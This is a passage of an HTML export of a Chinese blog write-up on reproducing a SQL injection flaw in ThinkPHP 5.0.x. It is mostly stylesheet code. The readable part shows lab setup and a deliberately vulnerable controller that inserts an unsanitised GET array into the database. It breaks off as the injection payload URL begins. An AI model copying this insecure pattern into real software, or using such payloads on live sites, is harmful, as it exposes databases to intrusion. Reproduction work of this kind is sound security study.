10.3863%2014.2122%2010.6995%2013.899%2010.6995%2013.5126Z%22%20fill%3D%22%23880e4f%22/%3E%0A%3C/svg%3E%0A");    --star-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M9.10433%202.89874C9.47114%202.15549%2010.531%202.1555%2010.8978%202.89874L12.8282%206.81024L17.1448%207.43748C17.9651%207.55666%2018.2926%208.56464%2017.699%209.14317L14.5755%2012.1878L15.3129%2016.487C15.453%2017.3039%2014.5956%2017.9269%2013.8619%2017.5412L10.0011%2015.5114L6.14018%2017.5412C5.40655%2017.9269%204.54913%2017.3039%204.68924%2016.487L5.4266%2012.1878L2.30308%209.14317C1.70956%208.56463%202.03708%207.55666%202.8573%207.43748L7.17389%206.81024L9.10433%202.89874Z%22%20fill%3D%22%23044289%22/%3E%0A%3C/svg%3E%0A");    --warn-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M8.68569%202.85232L2.12696%2014.7773C1.57714%2015.777%202.30038%2017.0002%203.44129%2017.0002H16.5587C17.6996%2017.0002%2018.4229%2015.777%2017.8731%2014.7773L11.3143%202.85232C10.7444%201.81615%209.25558%201.81616%208.68569%202.85232ZM10%206.75016C10.4142%206.75016%2010.75%207.08595%2010.75%207.50016V11.5002C10.75%2011.9144%2010.4142%2012.2502%2010%2012.2502C9.58579%2012.2502%209.25%2011.9144%209.25%2011.5002V7.50016C9.25%207.08595%209.58579%206.75016%2010%206.75016ZM10.75%2013.7502C10.75%2014.1644%2010.4142%2014.5002%2010%2014.5002C9.58579%2014.5002%209.25%2014.1644%209.25%2013.7502C9.25%2013.3359%209.58579%2013.0002%2010%2013.0002C10.4142%2013.0002%2010.75%2013.3359%2010.75%2013.7502Z%22%20fill%3D%22%238a2a0d%22/%3E%0A%3C/svg%3E%0A");    --light-bulb-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M13.073%2015L12.6891%2016.6051C12.5048%2017.3763%2011.8236%2017.935%2011.0181%2017.9947L10.8748%2018H9.12546C8.30655%2018%207.59%2017.4839%207.34866%2016.7385L7.31108%2016.6047L6.928%2015H13.073Z%22%20fill%3D%22%23b0791b%22/%3E%0A%3Cpath%20d%3D%22M10%202C13.3137%202%2016%204.59693%2016%207.80041C16%209.47737%2015.2546%2011.0164%2013.7961%2012.3942C13.7324%2012.4544%2013.6831%2012.5269%2013.6512%2012.6065L13.6251%2012.6883L13.311%2014H10.5002V9.49707C10.5002%209.22093%2010.2764%208.99707%2010.0002%208.99707C9.7241%208.99707%209.50024%209.22093%209.50024%209.49707V14H6.689L6.37626%2012.6886C6.34955%2012.5766%206.29016%2012.4745%206.20516%2012.3942C4.8153%2011.0819%204.07265%209.62354%204.00507%208.03903L4%207.80041L4.00321%207.60894C4.1077%204.49409%206.75257%202%2010%202ZM9.5%206.50238V7.50391C9.5%207.78005%209.72386%208.00391%2010%208.00391C10.2761%208.00391%2010.5%207.78005%2010.5%207.50391V6.50238C10.5%206.22624%2010.2761%206.00238%2010%206.00238C9.72386%206.00238%209.5%206.22624%209.5%206.50238ZM12.8506%207.44332C12.6553%207.24806%2012.3388%207.24806%2012.1435%207.44332L11.4353%208.15151C11.2401%208.34677%2011.2401%208.66335%2011.4353%208.85861C11.6306%209.05388%2011.9472%209.05388%2012.1424%208.85861L12.8506%208.15043C13.0459%207.95517%2013.0459%207.63858%2012.8506%207.44332ZM7.8521%207.44332C7.65684%207.24806%207.34026%207.24806%207.145%207.44332C6.94973%207.63858%206.94973%207.95517%207.145%208.15043L7.85318%208.85861C8.04844%209.05388%208.36503%209.05388%208.56029%208.85861C8.75555%208.66335%208.75555%208.34677%208.56029%208.15151L7.8521%207.44332Z%22%20fill%3D%22%23b0791b%22/%3E%0A%3C/svg%3E%0A");    --note-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M14%203C15.5977%203%2016.9037%204.24892%2016.9949%205.82373L17%206V10H13L12.8237%2010.0051C11.3072%2010.093%2010.093%2011.3072%2010.0051%2012.8237L10%2013V17H6C4.40232%2017%203.09634%2015.7511%203.00509%2014.1763L3%2014V6C3%204.40232%204.24892%203.09634%205.82373%203.00509L6%203H14ZM16.9007%2011.001C16.8232%2011.2376%2016.7018%2011.459%2016.5416%2011.6528L16.4142%2011.7929L11.7929%2016.4142C11.5687%2016.6384%2011.2968%2016.8039%2011.001%2016.9007L11%2013L11.0055%2012.8507C11.078%2011.8676%2011.8612%2011.0821%2012.8433%2011.006L13%2011L16.9007%2011.001Z%22%20fill%3D%22%23004d40%22/%3E%0A%3C/svg%3E%0A");    --elevated-background: var(--color-scale-gray-0);    --border: #f1f3f4;    --icon-color: var(--text-color);    --icon-filer: brightness(10);    --title-color: #08090b;    --monospace: var(--mono);    --mark-border: none;    --table-border: 1px solid var(--color-scale-gray-2) !important;}/* CJK override */:root {    --mono: var(--mono-font), var(--cjk-font);    --general-font: quote1, quote2, quote3, var(--text-font), var(--cjk-font), var(--fallback-font);    --display-font: quote1, quote2, quote3, var(--title-font), var(--cjk-font), var(--fallback-font);}html {    font-size: 16px;}body, .file-list-item-summary {    font-family: var(--general-font);    font-feature-settings: var(--general-font-feature-settings);    color: var(--text-color);    line-height: 1.6;}#write {    max-width: 860px;    margin: 0 auto;    padding: 30px;    padding-bottom: 100px;}@media only screen and (min-width: 1400px) {    #write {        max-width: 1024px;    }}@media only screen and (min-width: 1800px) {    #write {        max-width: 1200px;    }}#write>ul:first-child, #write>ol:first-child {    margin-top: 30px;}h1, h2, h3, h4, h5, h6 {    position: relative;    margin-top: 1rem;    margin-bottom: 1rem;    font-weight: bold;    line-height: 1.4;    cursor: text;    font-family: var(--display-font)!important;}h1, h2, h3, h4 {    color: var(--title-color);    letter-spacing: -0.04rem;}h6 {    margin-top: .6rem;    margin-bottom: .2rem;}h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor {    text-decoration: none;}h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {    font-size: inherit;}h1 {    font-size: 2.25em;    line-height: 1.2;}h2 {    font-size: 1.75em;    line-height: 1.225;}h3 {    font-size: 1.5em;    line-height: 1.43;}h4 {    font-size: 1.25em;}h5 {    font-size: 1em;}h6 {    font-size: 1em;    color: #777;}p, blockquote, ul, ol, dl, table {    margin: 0.8em 0;}li>ol, li>ul {    margin: 0 0;}h1 code, h2 code, h3 code, h4 code, h5 code, h6 code {    border: inherit;    background-color: inherit;}hr {    height: 2px;    padding: 0;    margin: 16px 0;    background-color: #e7e7e7;    border: 0 none;    overflow: hidden;    box-sizing: content-box;}li p.first {    display: inline-block;}ul, ol {    padding-left: 30px;}ul:first-child, ol:first-child {    margin-top: 0;}ul:last-child, ol:last-child {    margin-bottom: 0;}blockquote {    color: var(--text-color);    border: 1px solid var(--border);    background-color: var(--elevated-background);    border-radius: 4px;    padding: 12px 16px;    overflow: hidden;    box-sizing: border-box;}blockquote blockquote {    padding-right: 0;}table {    padding: 0;    word-break: initial;}table tr {    border: 1px solid #dfe2e5;    margin: 0;    padding: 0;}table tr:nth-child(2n), thead {    background-color: #f8f8f8;}table th {    font-weight: bold;    border: 1px solid #dfe2e5;    border-bottom: 0;    margin: 0;    padding: 6px 13px;}table td {    border: 1px solid #dfe2e5;    margin: 0;    padding: 6px 13px;}table th:first-child, table td:first-child {    margin-top: 0;}table th:last-child, table td:last-child {    margin-bottom: 0;}.CodeMirror-lines {    padding-left: 4px;}.code-tooltip {    border: 1px solid var(--border);    background-color: var(--elevated-background);    border-radius: 4px;    font-family: var(--general-font);    box-shadow: none!important;}.md-fences, code, tt {    color: var(--text-color);    border: 1px solid var(--border);    background-color: var(--elevated-background);    border-radius: 4px;    padding: 0;    padding: 2px 4px 0px 4px;    font-size: 0.9em;    font-family: var(--mono);    font-variant-ligatures: common-ligatures!important;    font-feature-settings: "liga" 1!important;}code {    background-color: var(--elevated-background);    padding: 0 2px 0 2px;}.md-fences {    margin-bottom: 15px;    margin-top: 15px;    padding-top: 8px;    padding-bottom: 6px;}.md-task-list-item>input {    margin-left: -1.3em;}@media print {    html {        font-size: 13px;    }    table, pre {        page-break-inside: avoid;    }    pre {        word-wrap: break-word;    }    input[type=checkbox] {        margin-top: -1px!important;    }}#write pre.md-meta-block {    padding: 1rem;    font-size: 85%;    line-height: 1.45;    background-color: var(--elevated-background);    border: 0;    border-radius: 4px;    color: #777777;    margin-top: 0 !important;}.mathjax-block>.code-tooltip {    bottom: .375rem;}.md-mathjax-midline {    background: var(--elevated-background);}#write>h3.md-focus:before {    left: -1.5625rem;    top: .375rem;}#write>h4.md-focus:before {    left: -1.5625rem;    top: .285714286rem;}#write>h5.md-focus:before {    left: -1.5625rem;    top: .285714286rem;}#write>h6.md-focus:before {    left: -1.5625rem;    top: .285714286rem;}.md-image>.md-meta {    border-radius: 4px;    padding: 2px 0px 0px 4px;    font-size: 0.9em;    color: inherit;}.md-tag {    color: var(--text-color);    opacity: 1;}.md-toc {    margin-top: 20px;    padding-bottom: 20px;}.sidebar-tabs {    border-bottom: none;}#typora-quick-open {    border: 1px solid var(--border);    background-color: var(--elevated-background);}#typora-quick-open-item {    background-color: var(--elevated-background);    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;    border-style: solid;    border-width: 1px;}/** focus mode */.on-focus-mode blockquote {    border-left-color: rgba(85, 85, 85, 0.12);}header, .context-menu, .megamenu-content, footer {    font-family: var(--general-font);}.file-node-content:hover .file-node-icon, .file-node-content:hover .file-node-open-state {    visibility: visible;}.mac-seamless-mode #typora-sidebar {    background-color: var(--elevated-background);    background-color: var(--side-bar-bg-color);}.md-lang {    color: #b4654d;}#md-notification .btn {    border: 0;}.dropdown-menu .divider {    border-color: #e5e5e5;    opacity: 0.4;}.ty-preferences .window-content {    background-color: var(--elevated-background);}.ty-preferences .nav-group-item.active {    color: var(--text-color);    background: #999;}.menu-item-container a.menu-style-btn {    background-color: var(--elevated-background);    background-image: linear-gradient( 180deg, hsla(0, 0%, 100%, 0.8), hsla(0, 0%, 100%, 0));}.cm-keyword {    color: var(--color-cm-keyword)!important;    font-weight: 700!important;}.cm-variable {    color: var(--color-cm-v)!important;}.cm-tag {    color: var(--color-cm-keyword)!important;    font-weight: 700!important;}.cm-variable-3, .cm-variable-2 {    color: var(--color-cm-v3)!important;    font-weight: 700!important;}.cm-def {    color: var(--color-cm-attr)!important;}.cm-attribute {    color: var(--color-cm-attr)!important}.cm-comment, .md-comment, .md-meta {    color: var(--color-cm-comment)!important;}.cm-string {    color: var(--color-cm-string)!important;    font-variant-ligatures: common-ligatures!important;}.cm-link {    color: var(--color-cm-link)!important;}.cm-type {    color: var(--color-cm-v3);}.cm-property {    color: var(--color-cm-v3)!important;}.cm-tag:not(.cm-bracket) {    font-weight: 700;}.cm-operator {    color: var(--color-cm-operator)!important;}.cm-number {    color: var(--color-cm-number)!important;}.cm-meta {    color: var(--color-cm-meta)!important;    font-weight: 700!important;}.cm-builtin {    color: var(--color-cm-builtin)!important;}li.task-list-item {    list-style-type: none}li.task-list-item>input[type=checkbox], #write input[type=checkbox] {    list-style: none;    background: none;    -webkit-appearance: none;    -moz-appearance: none;    appearance: none;    width: 24px;    height: 24px;    background-image: var(--checkbox-unchecked);    padding: 0;    margin-top: 1px;    margin-left: -32px;}li.task-list-item>input[type=checkbox][checked=checked], li.task-list-item>input[type=checkbox][checked], #write input[type=checkbox][checked=checked], #write input[type=checkbox][checked] {    background-image: var(--checkbox-filled);}a {    color: var(--text-link);}span.ty-icon.ty-delete-button::before {    background-image: var(--dismiss);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}i.fa.fa-folder-o::before {    background-image: var(--folder);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}i.file-node-icon.fa.fa-folder::before {    background-image: var(--folder);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}i.file-node-icon.fa.fa-file-text-o::before {    background-image: var(--document);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}i.fa.fa-caret-down::before {    background-image: var(--chevron-down);    vertical-align: middle;    content: " ";    width: 12px;    height: 12px;    display: inline-block;}i.fa.fa-caret-right::before {    background-image: var(--chevron-right);    vertical-align: middle;    content: " ";    width: 12px;    height: 12px;    display: inline-block;}.file-node-open-state {    width: 16px;    text-align: center;}span.ty-icon.ty-file-tree::before {    background-image: var(--tree);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}span.ty-icon.ty-left-arrow::before {    background-image: var(--arrowleft);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}span.ty-icon.ty-list::before {    background-image: var(--navigation);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}span.ion-ios7-search-strong::before {    background-image: var(--search);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}.sidebar-tab-btn, span.ion-ios7-search-strong, .sidebar-footer-item .footer-btn {    display: flex!important;    align-items: center!important;    justify-content: center!important;    vertical-align: middle!important;}span.ty-icon.ty-add::before {    background-image: var(--add);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-bottom: 2px;}span.ty-icon.ty-dots-v::before {    background-image: var(--dots);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-bottom: 2px;}span.ty-icon.ty-three-cells::before {    background-image: var(--cells);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-bottom: 2px;}mark {    border-radius: 4px;    color: var(--mark-text);    font-weight: inherit;    background-color: var(--mark-bg);    margin-left: 2px;    margin-right: 2px;    padding: 0px 4px 2px 4px;    border-bottom: var(--mark-border);}del {    border-radius: 4px;    color: var(--text-color);    font-weight: inherit;    background-color: #88888850;    margin-left: 2px;    margin-right: 2px;    padding: 0px 4px 2px 4px;    text-decoration-color: var(--text-color);    opacity: .3;}.sidebar-footer-item {    height: 100%;    vertical-align: middle;    justify-content: center;}.file-node-background {    height: 32px;}.file-library-node.file-tree-node.active>.file-node-content {    color: white;}.file-library-node.file-tree-node.active.file-node-on-edit>.file-node-content {    color: inherit;}.file-library-node.file-tree-node.active>.file-node-content>i {    filter: var(--icon-filer);}.file-library-node.file-tree-node.active>.file-node-background {    background-color: var(--accent-color);    border: none;}.cm-header, .cm-header-1 {    color: var(--title-font)!important;}.cm-atom {    color: var(--color-cm-builtin)!important;}/** Css below might be platform specified **/#filesearch-case-option-btn>svg, #searchpanel-case-option-btn>svg {    display: none;}#filesearch-case-option-btn::before, #searchpanel-case-option-btn::before {    background-image: var(--case);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}#filesearch-word-option-btn>svg, #searchpanel-word-option-btn>svg {    display: none;}#filesearch-word-option-btn::before, #searchpanel-word-option-btn::before {    background-image: var(--match);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}.mac-seamless-mode #md-searchpanel, #md-searchpanel {    box-shadow: 0 6.4px 14.4px 0 rgb(0 0 0 / 13%), 0 1.2px 3.6px 0 rgb(0 0 0 / 11%);    border-bottom: 1px solid var(--border);    max-height: 72px;}.mac-seamless-mode #md-searchpanel input, #md-searchpanel input {    height: auto;}.mac-seamless-mode #md-searchpanel.searchpanel-replace-mode, #md-searchpanel.searchpanel-replace-mode {    max-height: 108px;}.ion-chevron-up::before {    background-image: var(--chevron-up);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}.ion-chevron-down::before {    background-image: var(--chevron-next);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}.ion-close-round::before {    background-image: var(--dismiss);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;}table.md-table {    border: none!important;    box-sizing: border-box;    /* border-radius: 4px; */    overflow: hidden;}table {    border-collapse: separate;}tbody>tr>td:not(:first-child) {    box-sizing: border-box;    border: none;    border-right: var(--table-border);    border-bottom: var(--table-border);}tbody>tr>td:first-child {    box-sizing: border-box;    border: none;    border-bottom: var(--table-border);    border-left: var(--table-border);    border-right: var(--table-border);}tr>th:not(:first-child) {    box-sizing: border-box;    border: none;    border-top: var(--table-border);    border-right: var(--table-border);    border-bottom: var(--table-border);}tr>th:first-child {    box-sizing: border-box;    border: var(--table-border);}tr:first-child>th:first-child {    border-top-left-radius: 4px;}tr:first-child>th:last-child {    border-top-right-radius: 4px;}tbody>tr:last-child>td:last-child {    border-bottom-right-radius: 4px;}tbody>tr:last-child>td:first-child {    border-bottom-left-radius: 4px;}table tr:nth-child(2n), table thead>tr {    background-color: var(--elevated-background);}table tbody tr:nth-child(2n+1) {    background-color: var(--bg-color);}thead:last-child>tr:last-child>th:first-child {    border-bottom-left-radius: 4px;}thead:last-child>tr:last-child>th:last-child {    border-bottom-right-radius: 4px;}table {    font-feature-settings: "tnum";}blockquote>h1:first-child, blockquote>h2:first-child, blockquote>h3:first-child, blockquote>h4:first-child, blockquote>h5:first-child, blockquote>h6:first-child {    font: var(--title-font);    font-weight: 700;    font-size: inherit!important;    margin: -12px -16px -8px -16px;    padding: 12px 16px 8px 16px;    border-top-right-radius: 4px;    border-top-left-radius: 4px;    display: flex;    align-items: center;    letter-spacing: auto!important;}blockquote>h1:first-child {    color: var(--bookmark-color);}blockquote>h1:first-child::before {    background-image: var(--bookmark-filled);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-right: 4px;}blockquote>h2:first-child {    color: var(--star-color);}blockquote>h2:first-child::before {    background-image: var(--star-filled);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-right: 4px;}blockquote>h3:first-child {    color: var(--lightbulb-color);}blockquote>h3:first-child::before {    background-image: var(--light-bulb-filled);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-right: 4px;}blockquote>h4:first-child {    color: var(--note-color);}blockquote>h4:first-child::before {    background-image: var(--note-filled);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-right: 4px;}blockquote>h5:first-child {    color: var(--alert-color);}blockquote>h5:first-child::before {    background-image: var(--warn-filled);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-right: 4px;}blockquote>h6:first-child {    color: var(--question-color);}blockquote>h6:first-child::before {    background-image: var(--chat-help-filled);    vertical-align: middle;    content: " ";    width: 20px;    height: 20px;    display: inline-block;    margin-right: 4px;}</style><title>ThinkPHP5.0.X框架SQL注入漏洞</title></head><body class='typora-export os-windows'><div class='typora-export-content'><div id='write'  class=''><h1 id='thinkphp50x框架sql注入漏洞'><span>ThinkPHP5.0.X框架SQL注入漏洞</span></h1><h2 id='环境搭建'><span>环境搭建</span></h2><ol start='' ><li><span>自己还没有用composer,所以先用了phpstudy简答的搭建了一下环境</span></li></ol><h3 id='1-mysql创建数据'><span>1. mysql创建数据</span></h3><ol start='' ><li><code>create database thinkphp</code><span> 创建一个名为thinkphp的数据库</span></li><li><code>create table users(id int auto_increment primary key,username varchar(20),password varchar(30));</code><span>创建一个users表里面的段名为id,username,password,其中id设置为主键</span></li><li><span>接着插入数据</span><code>Insert into users(id,username,password) values(1,&#39;xbx_0d&#39;,&#39;tobebetter&#39;);</code></li></ol><h3 id='2-thinkphp基础配置'><span>2. ThinkPHP基础配置</span></h3><p><span>没学过ThinkPHP的同学可以参考上面提供的第一个资料</span></p><p><span> 1.开启debug模式</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311762253-4de65fb5-83b3-428a-9bdf-b7e34002cb26.png" referrerpolicy="no-referrer" alt="img"></p><p><span> 2.配置database文件</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637311910223-af6050fa-8125-4b81-97a4-32ad5a581558.png" referrerpolicy="no-referrer" alt="img"></p><p><span> 3.修改application\index\controller\index.php文件</span><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312397619-1b99b2d1-0902-43fb-a04e-9253055dad9f.png" referrerpolicy="no-referrer" alt="img"></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;?</span><span class="cm-variable">php</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">namespace</span> <span class="cm-def">app\index\controller</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">use</span> <span class="cm-variable">think\Db</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">class</span> <span class="cm-def">Index</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">index</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$name</span> <span class="cm-operator">=</span> <span class="cm-variable">input</span>(<span class="cm-string">"get.name/a"</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">Db</span>::<span class="cm-variable">table</span>(<span class="cm-string">"users"</span>)<span class="cm-operator">-&gt;</span><span class="cm-variable">where</span>([<span class="cm-string">"id"</span><span class="cm-operator">=&gt;</span><span class="cm-number">1</span>])<span class="cm-operator">-&gt;</span><span class="cm-variable">insert</span>([<span class="cm-string">"username"</span><span class="cm-operator">=&gt;</span><span class="cm-variable-2">$name</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-string">"ThinkPHP SQL Test."</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">?&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 314px;"></div><div class="CodeMirror-gutters" style="height: 314px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p><span> 4.尝试触发漏洞</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637312581283-6da25b8e-a05b-4d39-a8d0-f14f7a0aadc1.png" referrerpolicy="no-referrer" alt="img"><span>payload:</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">/</span><span class="cm-keyword">public</span><span class="cm-operator">/</span><span class="cm-variable">index</span>.<span class="cm-variable">php</span><span class="cm-operator">/</span><span class="cm-variable">index</span><span class="cm-operator">/</span><span class="cm-variable">index</span><span class="cm-operator">/</span><span 